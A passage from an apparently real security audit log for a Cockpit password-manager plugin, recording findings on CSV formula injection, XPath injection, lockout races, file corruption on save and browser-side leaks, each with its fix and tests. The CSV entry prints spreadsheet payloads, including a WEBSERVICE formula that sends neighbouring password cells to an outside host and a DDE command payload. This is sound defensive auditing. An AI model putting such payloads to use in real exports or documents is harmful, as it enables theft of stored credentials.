`ensure_ascii` settings.

### I31 · A CSV export is an execution channel · Sev L · MITIGATED
`_export_csv` wrote every field with `csv.QUOTE_ALL` and nothing else. RFC 4180 quoting is not a
formula-injection defence (CWE-1236): Excel and LibreOffice hand a QUOTED cell beginning with
`=`, `+`, `-`, `@`, TAB or CR to the formula parser. An entry field under A3's control therefore
became a live formula in the one artefact that holds every credential in the safe at once —
`=WEBSERVICE("http://…"&D2&D3)` reads the neighbouring Password cells and sends them out.
Measured: a URL of `=cmd|' /C calc'!A0` was written to the export verbatim, quoted and otherwise
untouched.

**Mitigation:** `base.csv_cell()` prefixes such a cell with an apostrophe, and `base.CsvWriter`
applies it to every field of every row so a new export format cannot forget; `validate.sh` bans
a raw `csv.writer` outside `base.py`. The cost is real and is stated rather than hidden: there
is no neutralisation a plain CSV reader can undo unambiguously, so a legitimate value beginning
with one of those characters — a password like `-hunter2` is the realistic case — gains a
leading apostrophe. The `export` reply therefore reports `neutralised: N` and its warning
explains it, the change is visible in the file, and docs/COMPATIBILITY.md records the divergence
from KeePassXC's CSV, which does not neutralise either. Refusing to export such an entry was
considered and rejected: it turns a hostile safe into a denial of the operator's own recovery
path.

Guards: `test_leakage03_*` (four) and the LEAKAGE-03 section of `adversarial.py`, which drives a
real `export` at euid 0 and reads the bytes back off disk.

### I32 · Caller text still reached a pykeepass XPath · Sev L · MITIGATED
docs/COMPATIBILITY.md §7 records the XPath-injection defect in `Entry._get_string_field`, fixes
`reveal()` by comparing element text in Python, and then warns: *"Anyone else passing
caller-supplied text to a pykeepass find_* / set_custom_property call has the same bug."*
`KdbxBackend.add()` was that call site and was never hardened — `PyKeePass.add_entry` opens by
calling `find_entries(title=…, username=…)` unconditionally, before it even looks at
`force_creation`. Measured: an entry titled `a"b`, a perfectly legal KeePass title, answered
`{"error": "internal", "detail": "the KDBX engine could not open this database"}` — a verb the
caller cannot use, and a sentence that is not true, since the database was open. The same
character was legal through `edit` and fatal through `add`. No value is disclosed (the match
only decides whether to raise "already exists"), but it is an unhardened caller-text-into-XPath
site surviving in a shipping verb after the docs declared the class fixed, and that becomes a
read the next time a `find_*` result is used for something other than a duplicate check.

**Mitigation:** `add_entry` is called with CONSTANT empty strings for title and username, which
removes the caller's text from the query rather than escaping it, and the two fields are then
written by `_set_field` — the same element-text technique §7 used for `reveal()`. (`None` would
skip the filter entirely and is tidier still, but pykeepass hands it to `E.Value()` and lxml
refuses it.) `_map_pykeepass_error` maps `lxml.etree.XPathError` to `invalid` rather than
`internal`, because a query WE built is never "we do not know what went wrong".
`validate.sh` bans `find_entries` / `find_groups` / `find_attachments` / `set_custom_property`
from `backends/kdbx.py` outright and pins the `add_entry` call site.

Guards: `test_leakage04_*` (three, including the §7 `reveal` payload as a control) and the
LEAKAGE-04 section of `adversarial.py`.

### I33 · Two honesty defects in the answers the helper gives · Sev L · MITIGATED
Grouped because each is one sentence of cause and neither is an exposure.

**A deeply nested request answered `internal`.** `parse_request` caught `ValueError` from
`json.loads`; a body of 100 000 open brackets raises `RecursionError`, which is a
`RuntimeError`, so it reached the top-level barrier and came back as
`{"error": "internal", "detail": "RecursionError"}` — in the same breath as a caller who sent
`not json` correctly getting `invalid`. `internal` is reserved for "we do not know what went
wrong" and for a request frame we always do: the caller sent it. The cost is bounded by Python's
own recursion limit (about 0.1 s), so this is taxonomy, not a denial of service — but the audit
log and the client both key off that code to tell a bad request from a broken helper. Now
`invalid: the request is nested too deeply to parse`, with a standing ban on the handler LINE,
not the word: a first version of the ban grepped for `RecursionError` and passed with the
handler deleted and the explaining comment left behind.

**`restore-backup` claimed more than it could deliver.** Every reply carried
`"note": "…so this restore is itself undoable"`, and the verb table shipped the same sentence as
its confirm text. The ring is a fixed-size ring of `keep` generations and every restore pushes
one more in, so after `keep` restores no generation holds the state the operator started from.
Measured with keep=3: four ordinary saves then five restores left the starting state in zero of
three slots, with every reply still saying "undoable". The reply now carries `undo` — a sentence
computed from the ring AFTER the write — and `ring_full`, so a caller can warn before the ring
starts discarding rather than after; the confirm text says the same thing. (The finding also
claimed this as an unauthenticated destruction path for A4. The skeptic refuted that half: script
in the Cockpit origin has `cockpit.spawn` with arbitrary argv and can simply unlink a user-class
safe, so the verb grants no primitive such an attacker lacks, and an admin-class safe needs the
superuser bridge, i.e. root, which is out of scope. What is left is an over-claiming confirm
string, which is what was fixed.)

Guards: the INPUT-2 and DURABILITY-3 sections of `adversarial.py`.

### I34 · Live-suite artefacts were written under the umask · Sev L · MITIGATED
`tests/browser/artifacts/.gitignore` states that a screenshot taken between "Reveal" and the
countdown ending is *a screenshot OF A PASSWORD* and that "the suite writes them 0600 for the
same reason". `writeArtifact` did pass `{ mode: 0o600 }` — for the console log and the JSON
results, which carry no secret. The two artefacts that DO contain plaintext secret material were
written by `page.screenshot({path})` and `download.saveAs()`, neither of which has a mode
option, so both landed under the 0002 umask as `-rw-rw-r--` on an SMB-exported tree, and
`run-live.sh` set no umask. Verified by opening the file: `03-revealed.png` shows an unmasked
Password field reading `already-expired` in a live Cockpit session, and the `.bin` holds the
decrypted attachment body.

No in-scope adversary could read them (`/srv/smb/share` is `drwxrws--- root:smbusers` and
`smbusers` has one member; `cptest` gets EACCES), and the passphrase in that run is the published
fixture one — so this is a stated control that was not in force, not a disclosure. It is fixed
anyway because docs/LIVE-WALKTHROUGH.md documents the harness as running against **this host's
real registry**, where the same code path would photograph a production password.

**Mitigation:** every artefact goes through `lockDown()` in `live-harness.js`, which chmods
0600; `saveDownload()` wraps the Playwright call so no spec calls `saveAs` directly;
`run-live.sh` sets `umask 077` as the belt to that brace; and `validate.sh` checks all three.
The artefacts already on disk were chmod'ed 0600.

Guard: `test_leakage02_*` (two).

### I35 · A hardware token's answer is a file constant · Sev L · OPEN, argued
`_serialize` rotates the master seed, the encryption IV and the inner stream key on every save
and deliberately does NOT rotate the KDF seed — it cannot, because it does not hold the
passphrase. But `challenge_for()` sends the KDF seed to the token as the challenge, so the
20-byte HMAC-SHA1 answer that opens a safe never changes. KeePassXC's `Kdbx4Writer` calls
`Kdf::randomizeSeed()` on every save and re-challenges the token, so there a captured answer
stops working at the operator's next save; here it works for as long as the file exists.

**This one is NOT mechanically fixed, and the argument is in docs/RESIDUAL-RISK.md §1.** In
short: rotating the seed for a challenge-response database requires a fresh token answer at SAVE
time, which the unlock protocol has no round for, and the two available mechanisms — a second
challenge round, or holding the composite key and paying a full KDF on every save — were judged
worse than the bug for a deviation whose only in-scope observer (A4/XSS) captures the passphrase
in the same keystroke. What was NOT acceptable was leaving it silent: `probe` and `unlock` now
both warn, in the operator's own words, that the token's answer for this file is the same value
every time.

Guards: `test_crypto03_constant_challenge_is_stated`, and
`test_crypto03_the_challenge_is_still_the_kdf_seed` as the reminder that a future change which
DOES rotate the seed must take the warning with it.

---

## Found by the re-gate of 0.2.1, after the remediation reported every gate green

The remediation of I23–I35 answered fourteen findings and left `./run_tests.sh` 17/17,
`./validate.sh` 47/0 and 38 new unit regressions green. The entries below were found by
re-gating that result on **2026-09-04** — by re-running every gate from a clean state,
installing the build on the host for the first time, and re-attacking the two places the
adversarial pass had left as "code-visible but unreproduced".

Two of them are defects the attack pass had already named and the remediation did not close:
**I41** is `CRYPTO-02`, which the remediation states in writing that it fixed and did not, and
**I39** is `WEB-01`, which appears in no remediation entry at all. That is the same failure the
whole exercise exists to catch, one level up: a remediation report is also written by the system
that wrote the fix. (**I41 is now MITIGATED** — see its entry, which also corrects the re-gate's
own too-narrow measurement of how far it reached. **I39 and I40 are now FIXED** — I39's entry
also records that the re-gate's own measurement was too GENEROUS: re-reproducing it before
fixing it found 34 attempts evaluated and 31 increments lost, not 44 and 7.)

(**I42 is now FIXED** — by the close-out pass, which is the "somebody who is not also reporting
on it" its own entry asked for, and which made the check strictly stronger rather than merely
quieter: it removed a false positive *and* closed a false negative the old check had.)

**ALL FOUR ARE CLOSED as of the close-out pass, 2026-09-04.** Each of the three product defects
was re-reproduced before being fixed, and then re-verified by a third pass that took neither fix
report on trust — including watching I41 reproduce end to end with one line of the fix reverted
(`save() -> {'ok': True}`, the live file rewritten, and a fresh unlock answering
`bad-credential`). `docs/STRESS-REPORT.md` §8 is that record.

`docs/STRESS-REPORT.md` carries the full command and output for each.

### I36 · A downloaded attachment outlives the Lock button · Sev L · OPEN
`downloadAttachment()` (`secrets.js:4715-4725`) hands the decrypted bytes to the browser as a
blob URL and revokes it on a fixed 10 s `setTimeout`. `lockNow()` does not revoke it, and there
is no other `revokeObjectURL` in the file. So for up to ten seconds after the operator has
explicitly locked the safe, the browser is still holding the plaintext of an attachment.

**Measured in the live page**, with `URL.createObjectURL`/`revokeObjectURL` hooked from a context
init script: after Lock, `revoked=0` and the URL was still valid, and a synthetic `<a download>`
click **succeeded** — 47 decrypted bytes written to disk on a safe the operator had closed.

**What limits it, and this is measured too.** Script cannot *read* the bytes: `fetch` against the
blob is refused by the package's own Content-Security-Policy with Chrome naming the directive
(`connect-src <- blob`), and because the blob is deliberately typed `application/octet-stream`
(the comment at the call site explains why), a `window.open` navigation yields an empty document
rather than a rendered one. So I9's refusal to relax the CSP is doing work here that it was not
designed for. What remains is that an attacker already in the origin (A4) can put a second copy
of an already-downloaded attachment on the operator's disk inside that window.

**Not fixed here.** The obvious fix — revoke in `lockNow()` — is safe, because the 10 s timer
exists only to let an in-flight save finish and a Lock is not in flight. It is left for a change
that can carry its own browser regression test.

### I37 · `clipboardClear()` announces success before the write resolves · Sev L · OPEN, NOT REPRODUCED
`clipboardClear()` (`secrets.js:2604`) clears the interval and sets `CLIP.armed = false` **before**
calling `navigator.clipboard.writeText("")`, catches a rejection with a bare
`/* best effort */`, and then unconditionally announces "Clipboard cleared because …". If that
write ever rejects — Chrome's documented "Document is not focused" is the obvious case, and the
two most common triggers for this function are `pagehide` and `visibilitychange → hidden` — the
password stays on the clipboard, the countdown is gone, nothing retries, and the operator is told
it worked.

**Nobody has made it fail.** Two independent lenses tried: Playwright's Chromium never let a tab
actually become hidden or lose focus (`visibilityState` stayed `"visible"` and
`document.hasFocus()` stayed `true` through `bringToFront()` on a second tab, headless **and**
headed under Xvfb), and revoking the `clipboard-write` permission mid-countdown did not produce a
rejection. The happy path is verified live: write #1 (len 26) resolved, the chip counted down, at
t+15 s write #2 (len 0) resolved and `readText()` returned `""`.

This is recorded rather than reported as a defect, because the failure it describes has never
been observed. Confirming it needs a person at a real desktop browser who can defocus the tab.
I17 already states that clipboard clearing is best-effort; what is not stated is that the page
announces success without checking.

### I38 · The agent's `_note()` does not redact · Sev L · OPEN
`secrets-admin::_note()` writes `redact(str(msg))`; `agent/secrets_agent.py::_note()` writes the
message straight to stderr. Every current call site in the agent passes either a static string or
an already-redacted `SecretsError.detail`, so **there is no live escape and none is claimed** —
this is a hole in a last line of defence, reachable only through a coding mistake that has not
been made. That is the same shape as I30, and the same reason it is worth closing: the value of a
blanket filter is that it covers the mistake nobody has made yet. `validate.sh` does not check
this, which is why the asymmetry survived.

### I39 · The unlock lockout does not survive concurrency · Sev M · FIXED 2026-09-04
This is the attack pass's `WEB-01`. It appeared in no remediation entry.

`lockout_fail()` reads the counter, computes, and writes it back with `O_TRUNC`, with no lock
between the three steps, and `lockout_check()` runs before the KDF while `lockout_fail()` runs
after — so the race window is the whole derivation. Fired at a hermetic registry with wrong
passphrases and the counter cleared before each batch:

```
sequential control, 8 guesses one at a time  -> 1 evaluated, then 7 × locked-out
10 concurrent -> {'bad-credential': 10}                  10 evaluated
25 concurrent -> {'bad-credential': 22, 'locked-out': 3} 22 evaluated
50 concurrent -> {'bad-credential': 44, 'locked-out': 6} 44 evaluated
   counter after the 50: {"failures": 43, …}   -- 7 increments lost as well
```

Guessing still costs a full KDF per attempt and the constant-time floor is untouched, so this is
not an offline attack. What is defeated is the promise that guessing is bounded by a **threshold**
rather than only by CPU. Reachable by anyone who can spawn the helper repeatedly: the owner of a
user-class safe, or script in the Cockpit origin driving `cockpit.spawn` in a loop.

**RE-REPRODUCED BEFORE FIXING, and it is worse than the re-gate measured.** The skeptic REFUTED
this during the red-team pass; the refutation was wrong. Same method, 2026-09-04, hermetic
registry, counter cleared before each batch:

```
sequential control, 8 guesses one at a time  -> 1 evaluated, then 7 × locked-out
10 concurrent -> {'bad-credential': 10}                  10 evaluated
25 concurrent -> {'bad-credential': 22, 'locked-out': 3} 22 evaluated
50 concurrent -> {'bad-credential': 34, 'locked-out': 16} 34 evaluated
   counter after the 50: {"failures": 3, …}   -- 31 increments lost
```

Thirty-four attempts evaluated against a threshold of five, and a counter that ended up reading
**three**. The lost-update count varies run to run because it is a race; the shape does not.

**FIXED.** Three things were wrong and all three had to change, because any one of them alone
would have left the property false:

1. **Read-modify-write with no lock.** Every access to a counter file now goes through
   `_StateTxn`, which opens it `O_RDWR|O_CREAT|O_NOFOLLOW` and holds `flock(LOCK_EX)` on that
   same fd across the read AND the write.
2. **The check ran before the KDF and the increment after it.** Even a perfectly atomic counter
   would not have helped: the race window WAS the derivation, and every concurrent caller
   legitimately saw a counter nobody had moved yet. The attempt is now RESERVED —
   `lockout_begin()` checks and increments in one locked transaction — before any key is
   derived, and `lockout_settle()` closes it out afterwards: a wrong passphrase keeps the
   reservation, an error that never consumed a guess gives it back, a correct passphrase clears
   the counter.
3. **`lockout_reset()` unlinked the file.** `flock` is held on an inode; unlinking hands the
   next arrival an `O_CREAT` of a *different* inode, and two processes then hold two "exclusive"
   locks on two files with the same name. The counter is zeroed in place now. Nothing was
   exploiting this — reaching that line needs the passphrase — but an exclusion primitive with
   an exception in it is not one. The cost is the litter `docs/ROOT-VERIFICATION.md` F2 recorded
   as a surprise: one 60-byte 0600 JSON per (real uid, safe), now deliberate rather than
   accidental.

**Why `flock` and not the other two options in the fix shape.** The counter lives in
`/var/lib/cockpit-secrets/state` (root-owned, 0700) on the admin path and in the caller's own
`~/.local/state/cockpit-secrets/state` on the user path. Both are local filesystems and both are
single-owner directories, so the only contenders for a file are helper processes of the same
principal class. The property that decides it is **release on death**: this helper is spawned
once per verb by a browser channel that can vanish mid-derivation, and a killed process drops
its `flock` in the kernel with no reaper, no timeout and no stale-lock heuristic. An `O_EXCL`
sidecar has exactly the opposite property, and "the holder looks dead" is the guess `LockFile`
refuses to make about the safe file itself for the same reason. Counting `O_EXCL` token files by
listing adds a third problem: an unbounded directory that has to be swept, inside the one
directory whose security property is that nothing but this program writes there.

**The lock does not become the denial of service.** Three things keep it that way, and the third
is the one that matters most for I40: nothing blocking happens while the lock is held (one
`read` and one `write` of a document under 200 bytes — no KDF, no safe file, no network, there
is none); the wait is bounded by `LOCKOUT_LOCK_SECONDS` (5 s) rather than indefinite, and
expiring it **fails closed**, because letting an attempt through on a busy counter would make
"hold this file open" the off switch for I16; and the per-principal counter is a *different file
per principal*, so a wedged helper belonging to operator A cannot stall operator B at all. Only
the per-safe cap is shared, and its critical section is the same few microseconds.

That is measured rather than argued. A foreign process takes `flock(LOCK_EX)` on operator A's
counter and holds it, at a real euid 0 through the root runner:

```
A, CORRECT passphrase -> locked-out in 5.31 s
   detail: "the lockout counter for this safe is busy; the attempt was refused
            rather than left uncounted"
B, CORRECT passphrase -> handle minted, 0.86 s      <- unaffected, not even slowed
lock released; A      -> handle minted, immediately
```

Fail closed, bounded, and isolated per principal — the three things that had to be true at once.
`tests/integration/lockout.py` section F does the unprivileged half;
`tests/root/driver_lockout.py` section 7 does the two-principal half, which is the one that needs
two real uids behind euid 0.

**Regression test:** `tests/integration/lockout.py`, sections A and B — a sequential control of
8 guesses, then `CONCURRENCY = 50` real helper PROCESSES fired at once, asserting that the
counter on disk equals the number of attempts actually evaluated *exactly* (a lost update makes
those two numbers differ and nothing else does) and that the concurrent distribution matches the
sequential one. Watched to fail against the committed pre-fix helper: 38 evaluated, counter 36,
5 checks red.

### I40 · Every administrator shares one lockout counter per admin safe · Sev M · FIXED 2026-09-04
`_lockout_path()` (`secrets-admin:1203`) built `"fail.%d.%s.json" % (os.geteuid(), safe_id)`. On
the admin path every operator is euid 0, so there is one counter per admin safe for everybody.
`ident.real_uid` is available at that line and is not used. I16 and `docs/ARCHITECTURE.md` step 6
both say the counter is per-**(uid, safe id)**.

The browser lens found this by reading and could not reproduce it, because reaching euid 0 needs
the superuser path `cptest` cannot obtain. Reproduced through the `/srv/jobs` root runner against
a real root-owned admin-class entry:

```
operator A (SUDO_UID=1000) mistypes ONCE
counter files on disk: fail.0.zz-lockout-probe.json      <- one file, euid not uid
operator B (SUDO_UID=1007), who has typed nothing, offers the CORRECT passphrase
   -> locked-out
```

Two consequences: one administrator's typo denies the safe to every other administrator, and the
lockout state cannot attribute — it records no identity, so it cannot say whose failures they
were. (The audit log does record that.)

**RE-REPRODUCED BEFORE FIXING**, this time without the root runner: inside `unshare -r` the euid
really is 0, so the admin branch of `gate()` really runs and `SUDO_UID` is really believed —
which is the whole mechanism, minus a root-owned registry.

```
identity as A: {"euid": 0, "real_uid": 1000, "escalated": true, "class_available": "admin"}
operator A (SUDO_UID=1000) mistypes ONCE          -> bad-credential
counter files on disk: ['fail.0.lab-admin.json']  <- ONE file, euid not uid
operator B (SUDO_UID=1007), correct passphrase    -> locked-out
```

After the fix, same script, same registry: `['fail.1000.lab-admin.json', 'safe.lab-admin.json']`
and B gets `ok, handle minted`.

**FIXED, in two parts, because keying on the real uid alone would have been theatre.**

*Part one — the accountability fix.* `_lockout_paths()` keys the per-principal counter on
`ident.real_uid`. That is the field that exists to answer "who actually asked" behind an
escalation, it is what the audit log has always been keyed on, and it is what I16 and
`docs/ARCHITECTURE.md` step 6 both said the counter was. No fallback is needed: `real_uid` is
already `getuid()` when there is no `SUDO_UID`/`PKEXEC_UID`, and those are read only at euid 0
because an unprivileged caller can set them to anything.

*Part two — the number an attacker could change.* Per-real-uid is right for accountability and
for not locking innocent administrators out, and on its own it is a counter that resets when the
attacker edits one environment variable. Two things now stop that, and only the second is new:

* **The class gate gets there first, and this is measured** (`tests/root/driver_lockout.py`
  section 5). A `SUDO_UID` naming somebody who is not in an administrative group is
  `access-denied` *before* the counter is consulted, and mints no counter file at all — the same
  for a uid with no account. So the fresh counters an attacker at euid 0 can mint number one per
  **administrator of this host**, not one per integer. That bounds the attack; it does not close
  it, and on a host with a large `sudo` group it barely bounds it.
* **A second counter that no identity resets: a per-SAFE attempt cap.** `LOCKOUT_SAFE_THRESHOLD`
  (20) credential attempts per `LOCKOUT_SAFE_WINDOW` (60 s), counting every principal together,
  reserved in the same locked transaction as the per-principal one. A reservation the cap
  refuses is given back to the principal, so nobody is charged for an attempt they never made.

  It is a FIXED-WINDOW RATE CAP and not a second lockout, and that difference is what makes it
  safe to have. Given the per-principal escalation, one bad actor could deny a safe to every
  operator for fifteen minutes — a worse hazard than the one being closed. A fixed window bounds
  the denial anyone can cause with it to **one window, 60 s**, whatever they do. A successful
  unlock clears it as well, which is a deliberate trade recorded in `lockout_reset`'s docstring:
  somebody just proved they hold the key, so the run of failures was not the campaign the cap
  exists to stop, and an attacker cannot reach that line.

**Regression tests.** `tests/root/45-lockout-principals.sh` + `driver_lockout.py` — the
two-principal proof at a real euid 0 through `/srv/jobs`, because `unshare -r` gives a real euid
0 with a real uid of 0 behind it and cptest cannot escalate at all, so this is the only place
the defect can be measured properly. It asserts the counter's FILE NAME carries the real uid,
that B opens the safe with the correct passphrase while A is locked out, **and in the same
breath that A is still counted** — because "fix it by counting nobody" would pass the first two
checks and destroy I16. `tests/integration/lockout.py` section D proves the per-safe cap against
25 synthetic principals: exactly 20 admitted, 5 refused, 25 separate counter files with nobody
sharing, and the cap lifting when the window expires.

### I41 · PWS3 never got I24's per-save reader check · Sev M · MITIGATED (2026-09-04)
This was the attack pass's `CRYPTO-02`, and I24 stated in writing that it was fixed. It was not
— see the CORRECTION in I24, and the UPDATE under it now that it is.

**What it was.** `backends/kdbx.py` `save()` called `_assert_lossless()` **and then
`_verify_own_output(data)`**, so the reader re-ran on every save. `backends/psafe3.py` `save()`
called `_ensure_lossless()` and nothing else, and `_ensure_lossless()` short-circuited on
`self._lossless_checked`, set `True` on its first run and cleared only in `lock()`. So on PWS3
the I22 round-trip guard ran once per session, exactly as before the remediation.

Reproduced against the real backend on a copy of the committed fixture:

```
save 1 (ordinary edit)  : True    latch AFTER save 1: True   <- guard now off for the session
save 2, 5 MiB notes field in the SAME session
   save -> {'ok': True, 'bytes': 5244200}     file REWRITTEN
   reopen -> BadCredential: "the passphrase did not open this safe"
   (reader, on stderr: "PWS3 field length 5242880 exceeds the 4194304 byte limit")
```

The safe was destroyed, the save reported success, and the reader then blamed the operator's
passphrase — the one answer that sends them to guess again and trip I39/I40 on a safe that is
broken rather than locked. The previous generation is in the backup ring, so this was
recoverable data loss.

I23 states the principle this broke in its own words: *"the read and write limits are now the
same number and this program cannot write a file its own reader refuses."* True for KDBX; false
for PWS3.

#### CORRECTION: it was reachable through the shipping `edit` verb, and the 1 MiB cap was not in the way

This entry previously said, under *"How far it reaches today, measured"*, that the defect did
not reach the shipping helper by this route because `MAX_REQUEST_BYTES` is 1 MiB and `edit`
carries the whole new value, so a frame setting a >4 MiB field is refused. **That is true of the
field the re-gate happened to use and false of the defect.** It was checked again before the fix
and the conclusion is the opposite one.

Field `0x0f`, the password history, is written by the HELPER rather than carried by the caller,
and it **grows**. Note [12] gives it 255 slots (`PWH_MAX_ENTRIES`) and each slot holds up to
`PWH_MAX_PASSWORD` = 0xFFFF characters, so the field's ceiling is about 16.7 MB — four times
`Limits.MAX_FIELD_BYTES` — and it is reached one ordinary `edit` at a time. `password-history`
is itself a published, editable field name, so one ~90-byte frame turns the history on with the
format's maximum slot count. Driven through the real `secrets-admin` `open` session against the
committed fixture:

```
save 1 (ordinary edit)                 -> {"ok": true}          the I22 latch closes
edit password-history = "1ff00"        -> accepted              ~90 bytes
66 x edit password = 65535 chars       -> accepted              65 680 bytes per frame
save 2                                 -> {"ok": true, "bytes": 4327480}
unlock, in a FRESH helper process      -> bad-credential
```

The largest frame in that run was 65 680 bytes — **six per cent** of the cap that was supposed
to be what stood in the way. The cap prevented nothing. The re-gate's own instinct was the
right one and its measurement was too narrow: *a defect that is only unreachable by accident
should be treated as reachable*, and this one was not even that.

**Mitigation, in three parts.**

1. **The guarantee, and it is in `base.py` so a third backend cannot omit it.**
   `Backend.verify_own_output()` is the shared policy: re-open the bytes about to be written
   through the reader a later `unlock` uses, compare them against the database that was
   serialised, and raise `Conflict` with the live file untouched if either step fails. It stands
   on two format-specific hooks, `read_back()` and `diff_read_back()`, and **both refuse by
   default** — `verify_structure`'s precedent — so a backend that has not written them cannot
   save at all rather than saving bytes nothing has checked. `Psafe3Backend` implements both;
   `save()`, `save_as()` and the module-level `write_file()` all run the check, inside the lock,
   on the exact bytes, on **every** save. `_ensure_lossless()` stays as the I22 EARLY warning and
   is no longer the thing standing between a mutation and the disk; its docstring now says so.
2. **The omission that was left is calling it**, so that is banned too. `_unverified_writes()`
   in `backends/base.py` parses every module in `backends/` and fails any `save`/`save_as` on a
   `Backend` subclass that reaches `atomic_replace` without a `*verify_own_output` call in the
   same function body. It ran red on `psafe3.py:2719` and `psafe3.py:2747` before the fix — the
   two lines this entry is about — and the self-check plants a forgetful third backend in a
   temp directory to prove the ban still fires.
3. **The cause, at the layer the asymmetry lives on.** `_emit_field` now calls
   `_check_field_length` — the READER's bounds check, the same function, the same constants, the
   same type-awareness, so an attachment still gets its 32 MiB cap and everything else gets
   4 MiB. I23's sentence is now true for PWS3 by construction and not only by round trip.

**The misattribution is fixed separately, because it is the part that costs the operator their
next move.** `_decode()` takes `own_output=True`, which is passed by exactly two callers — the
pre-write check and the I22 early guard — and does exactly one thing: a structural failure keeps
its real detail instead of being flattened into `BadCredential`. **I6's oracle is not reopened.**
The flattening exists to deny a caller who supplies BOTH a file and a passphrase guess any
per-guess signal; this path takes neither, since the bytes were built by this process from an
already-authenticated database under a credential it already holds. `unlock()`, `parse_bytes()`
and `read_file()` never pass the flag and cannot be made to from a request, and the self-check
asserts that a wrong passphrase and a tampered file still come back as the identical
`bad-credential` sentence. The difference is not that we relaxed a rule; it is that this file is
one WE wrote and can verify before handing it over.

**After the fix, the same run:**

```
save 2  -> {"error": "conflict",
            "detail": "this database cannot be written: PWS3 field length 4260599
                       exceeds the 4194304 byte limit"}
live safe sha256                       -> unchanged, byte for byte
unlock, in a FRESH helper process      -> opens, 4 entries
```

Guards, each watched failing with the fix reverted:

* `tests/integration/adversarial.py::crypto02_pws3` — the whole sequence above through the real
  helper, asserting the `conflict`, that the detail is **not** about a passphrase, that the live
  file's sha256 is unchanged, and that a fresh helper still opens it. Reverted, six of its checks
  fail, including *"a fresh helper still opens the safe -> bad-credential"*.
* `python3 -m backends.psafe3`, *the pre-write reader check (I24, I41)* — the twin this entry
  existed for. It makes the READER stricter than the writer for the duration of one save
  (`Limits.MAX_ENTRIES = 0`, a read-side cap `serialize` does not consult, so the asymmetry is
  genuine rather than a patched-out guard), then asserts the latch HAS closed, the save is
  refused as `conflict`, the detail is not the bad-credential sentence, the live file is
  byte-for-byte unchanged, an ordinary save still succeeds, and a wrong passphrase and a
  tampered file are still indistinguishable.
* `python3 -m backends.psafe3`, *the write half of the read limit (I23, I41)* — `_emit_field`
  refuses exactly what `_parse_field_stream` refuses, and an attachment of the same size is
  still written.
* `python3 backends/base.py`, *verify_own_output (I24, I41)* — the default hooks refuse, every
  refusal is a `Conflict` and never `bad-credential`, an unexpected exception contributes its
  class name and not its value (I15), the ban reports zero offenders, and a planted forgetful
  backend makes it report one.

### I42 · The live suite's I11 storage check is a false statement · Sev L · FIXED 2026-09-04 (test defect)
`live-ui.spec.js` item 4 asserts that an unlock added no key to either web-storage area, treating
a key whose VALUE CHANGED LENGTH as added. The intent is right and the comment says so:
*"overwriting Cockpit's own key with a passphrase would otherwise slip through a names-only
comparison."*

But a Cockpit package page is an iframe on the shell's own origin, and Cockpit's shell writes and
rewrites `sessionStorage["cockpit:page_status"]` on behalf of stock pages. Measured with this
package never opened in the browser context:

```
after login             session=["cockpit:v2-machines.json"]
after stock /system     session=["cockpit:page_status","cockpit:v2-machines.json"]
   value names "updates" and "system/services"; mentions 'secret'? false
and it changes length while it sits there:
   t+2s len=235 "Checking for package updates..."   t+20s len=223 "Security updates available"
```

That 235→223 transition is exactly what item 4 flagged. Both live runs of this re-gate failed on
it — in run 1 the key was absent from the baseline and appeared; in run 2 it was present and
changed length. `secrets.js` contains no `page_status` and two standing gates assert it names no
browser storage API at all; both PASS. The page is byte-identical (`secrets.js` sha256
`7f03c81c…`) to the one that scored 140/140 in the previous round — and to the one that scored
131/131 after this entry was fixed, which is the point: no browser-side code changed at any stage
of this.

Every assertion in item 4 that would catch a real leak passed: no storage key belongs to this
package, no IndexedDB database was opened, and the passphrase is in neither storage area, no
cookie, no DOM node and no live input.

**Deliberately not fixed by the re-gate.** Editing an oracle so that a number comes out right is
the exact failure this exercise exists to catch, and this assertion should be re-armed by somebody
who is not also reporting on it. **Fix shape:** for a key that changed, ask *inside the page*
whether the new value contains the passphrase or a marker from this package and return a boolean —
strictly stronger than a length comparison, which a same-length overwrite already defeats.

**FIXED, 2026-09-04, by the close-out pass — and made STRONGER, not more lenient.** The fix shape
above is what was built, plus the one thing that keeps an exemption from being leniency in
disguise.

*What `readStorage` now returns.* Per key, a length **and** `hits`: the LABELS of the probes whose
text was found in that key's value, computed inside the page. No value ever leaves the browser —
a helper that returned the values would put every one of them into the suite's memory and into any
artefact that printed it, which is the hazard rather than a check of it. The probes are the
passphrase, the password the run revealed, the safe's registry id, and the string
`cockpit-secrets`.

*The three rules `storageAdded` now applies.* A key that is **new** is reported whatever its name.
A key that **changed length** is reported unless it is a named host-shell key. And **any** key,
new or old, exempt or not, whose value now contains a probe is reported — that rule has no
exemption at all.

*The exemption, named, with its reason in the source.* `HOST_SHELL_KEYS` is exactly
`["cockpit:page_status"]`, and the comment above it carries the measurement in this entry so a
later reader can see why it is there without having to find this file. Being on that list buys a
key **only** the right to change length; it never buys it exemption from the content probes. The
suite prints the waiver as a note on every run, so a growing exemption shows up in the log rather
than in silence.

*Why this is strictly stronger than what it replaced,* proved rather than asserted —
`tests/browser/storage-check.selftest.js` lifts the shipping functions out of `live-ui.spec.js` by
source extraction (so it cannot drift from them) and runs four scenarios plus two assertions about
the exemption itself. Two of the four are the ones that matter, and the OLD check got **both**
wrong:

```
I42's real scenario, page_status 235 -> 223   new: not flagged   old: FLAGGED   <- the false statement
same-LENGTH overwrite of page_status
   with the passphrase                        new: FLAGGED       old: not flagged  <- a real leak the old check MISSED
a new key written by this package             new: FLAGGED       old: FLAGGED
a non-tolerated key that changed length       new: FLAGGED       old: FLAGGED
```

So the repair did not trade correctness for a green number: it removed a false positive and closed
a false negative in the same change. The self-check needs no browser and runs in `run_tests.sh`,
which is the point — the live suite cannot run without Cockpit, an account password and a
registered safe, but the oracle behind its one negative assertion now has a guard that runs
everywhere.

**Evidence it holds live.** `./tests/browser/run-live.sh`, 2026-09-04, against the installed
package and this host's real Cockpit: item 4 PASS, **109/109** in `live-ui` and 22/22 in
`live-access`, exit 0. The same `page_status` transition happened again during the run and appears
in the log as the tolerated note it now is:

```
....  host-shell keys that changed and were tolerated by name:
      ["session.cockpit:page_status 235 -> 223"]  (tolerated list: ["cockpit:page_status"])
PASS  the unlock added NOTHING to either storage area and wrote nothing of ours into a key
      that was already there ([] local, [] session, ...)
PASS  no storage value in either area contains the passphrase, a revealed password, the safe's
      id or this package's name — the tolerated keys included ([])
```

---

## Found by the red-team round on the 0.4.0 registry-write feature

Twelve findings, all in the code that lets an operator **create** a safe and **adopt** an existing
one — `safe-create`, `import-begin` / `-chunk` / `-inspect` / `-commit` / `-abort`, `safe-forget`
